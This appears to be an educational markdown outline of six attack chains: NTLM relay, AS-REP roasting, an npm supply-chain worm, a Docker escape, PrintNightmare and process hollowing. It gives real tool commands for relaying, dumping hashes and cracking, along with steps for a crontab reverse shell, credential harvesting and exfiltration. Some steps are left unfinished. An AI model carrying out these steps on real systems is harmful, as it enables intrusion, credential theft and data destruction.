

# Standardized Attack Examples

## Scenario 1: SMB Relay (SOCKS)

**Summary**: Relaying captured NTLM auth to create a SOCKS tunnel for dumping credentials.
**Technical Flow**:

1. **[Attacker (Kali)]** `nmap -p445 --script=smb2-security-mode` -> **[Target (Windows)]** (Check Signing)
2. **[Attacker (Kali)]** `ntlmrelayx.py -tf targets.txt -socks` -> **[Target (Windows)]** (Start Listener)
3. **[User (Victim)]** Authenticates (SMB) -> **[Attacker (Kali)]** (Poison/Relay)
4. **[Attacker (Kali)]** Relays Auth -> **[Target (Windows)]** (Bypass Auth)
5. **[Attacker (Kali)]** `proxychains secretsdump.py` -> **[Target (Windows)]** (Dump Hashes via SOCKS)




# 1. Recon & Setup: Check SMB signing a
nmap --script=smb2-security-mode.nse -p445 10.0.2.73

# 2. Start impacket-ntlmrelayx listener
impacket-ntlmrelayx -tf targets.txt -smb2support

# 3. phishing to make Victim connect back to Attacker as SMB service 


# 4. Attack Execution (Choose one method below)
victim connects back to ntlrelayx listener


# 5. Attack Execution (Choose one method below)
ntlmrelayx , relays auth to target server , 

# 6. leverage that to dump hashes



---

## Scenario 2: AS-REP Roasting

**Summary**: Requesting Kerberos TGT for users without Pre-Auth to crack hashes offline.
**Technical Flow**:

1. **[Attacker (Kali)]** `impacket-GetNPUsers -request` -> **[DC (Windows Server)]** (Request TGT)
2. **[DC (Windows Server)]** Returns TGT Hash -> **[Attacker (Kali)]** (Capture Hash)
3. **[Attacker (Kali)]** `hashcat -m 18200` -> **[Credential (TGT Hash)]** (Offline Crack)

---

## Scenario 3: Shai Hulud 2 (Supply Chain)

**Summary**: Full supply chain compromise via npm to cloud persistence.
**Technical Flow**:

1. **[Attacker]** Phishing/MFA Bypass -> **[User (NPM Maintainer)]**
2. **[Attacker]** Publish Poisoned Package (Setup Bun.js) -> **[Registry (NPM)]**
3. **[Victim (Dev Machine)]** `npm install` -> **[Registry (NPM)]** (Download Malware)
4. **[Malware (Process)]** Forks Detached Process -> **[Victim (Dev Machine)]** (Avoid Detection)
5. **[Malware (Process)]** Scans `~/.aws`, `~/.ssh` -> **[File System (Data)]** (Harvest Creds)
6. **[Malware (Process)]** Git Push "Shai-Hulud" -> **[GitHub (Cloud)]** (Exfiltrate to Public Repo)
7. **[Attacker]** Register Self-Hosted Runner -> **[GitHub (Cloud)]** (Persistence)
8. **[Malware (Process)]** Uses Stolen Token -> **[Registry (NPM)]** (Worm Propagation)
9. **[Attacker]** Access Infrastructure -> **[Cloud (AWS/Azure)]** (Lateral Movement)
10. **[Malware (Process)]** `shred` Home Dir -> **[Victim (Dev Machine)]** (Destructive Cleanup)

---

## Scenario 4: Docker Privileged Escape

**Summary**: Breaking out of a container by mounting the Host OS filesystem and injecting a malicious Cron job.
**Technical Flow**:

1. **[Attacker (Container)]** `capsh --print` -> **[Kernel (Capabilities)]** (Verify Privileged Mode)
2. **[Attacker (Container)]** `fdisk -l` -> **[Host (Filesystem)]** (Identify Host Drive)
3. **[Attacker (Container)]** `mount /dev/sda1 /mnt/host` -> **[Host (Filesystem)]** (Breach Boundary)
4. **[Attacker (Container)]** `echo "payload" >> /mnt/host/etc/crontab` -> **[Host (Config)]** (Persistence Injection)
5. **[Host (Cron Service)]** Reads crontab -> **[Host (Process)]** (Execution)
6. **[Host (Process)]** Spawns Reverse Shell -> **[Attacker (Listener)]** (Full Compromise)

---

## Scenario 5: PrintNightmare (RCE)

**Summary**: Coercing the Windows Print Spooler to load a malicious DLL from an attacker-controlled SMB share.
**Technical Flow**:

1. **[Attacker (Kali)]** `smbserver.py share ./payloads` -> **[Attacker (SMB Share)]** (Host Malicious DLL)
2. **[Attacker (Kali)]** `python3 CVE-2021-1675.py` -> **[Target (Spoolsv)]** (RPC AddPrinterDriver)
3. **[Target (Spoolsv)]** Connects to Share -> **[Attacker (SMB Share)]** (Fetch DLL)
4. **[Target (Spoolsv)]** Loads `evil.dll` -> **[Target (Memory)]** (DLL Injection)
5. **[Target (Spoolsv)]** Spawns `cmd.exe` (SYSTEM) -> **[Target (Process)]** (Privilege Escalation)

---

## Scenario 6: Process Hollowing (Evasion)

**Summary**: Creating a legitimate suspended process, carving out its memory, and replacing it with malware to hide in plain sight.
**Technical Flow**:

1. **[Malware (Dropper)]** `CreateProcess("calc.exe", SUSPENDED)` -> **[Target (OS)]** (Spawn Decoy)
2. **[Target (OS)]** Creates Process -> **[Calc.exe (Suspended)]** (Child Process)
3. **[Malware (Dropper)]** `ZwUnmapViewOfSection` -> **[Calc.exe (Memory)]** (Hollow Out)
4. **[Malware (Dropper)]** `WriteProcessMemory(Payload)` -> **[Calc.exe (Memory)]** (Inject Code)
5. **[Malware (Dropper)]** `ResumeThread` -> **[Calc.exe (Process)]** (Activate Malware)
6. **[Calc.exe (Process)]** Beacons C2 -> **[Attacker (C2 Server)]** (Evasion Success)

---
